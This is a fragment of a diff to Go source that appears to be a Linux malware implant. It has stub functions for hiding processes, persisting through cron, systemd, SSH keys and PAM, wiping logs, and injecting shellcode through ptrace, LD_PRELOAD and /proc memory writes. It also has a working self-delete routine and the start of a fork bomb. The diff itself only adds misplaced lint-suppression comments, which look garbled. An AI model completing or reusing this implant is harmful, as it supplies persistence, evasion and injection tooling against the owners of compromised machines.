@@ -183,40 +183,40 @@ func calculateSleep(config *Config) time.Duration {
 }
 
 func hideProcess() {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func persistCron() {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func persistSystemd() {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func persistSSHKeys() {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func persistPAM() {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func cleanupLogs() {
 }
 
 func selfDestruct() {
 	_ = os.Remove(os.Args[0])
 	syscall.Exit(0)
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func injectProcess(targetPID int, shellcode []byte) {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func ptraceInject(targetPID int, shellcode []byte) {
 }
 
 func LDPreload(payload string) {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func procMemWrite(targetPID int, data []byte) {
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func forkBomb() {
 	for i := 0; i < 10; i++ {
 		go func() {
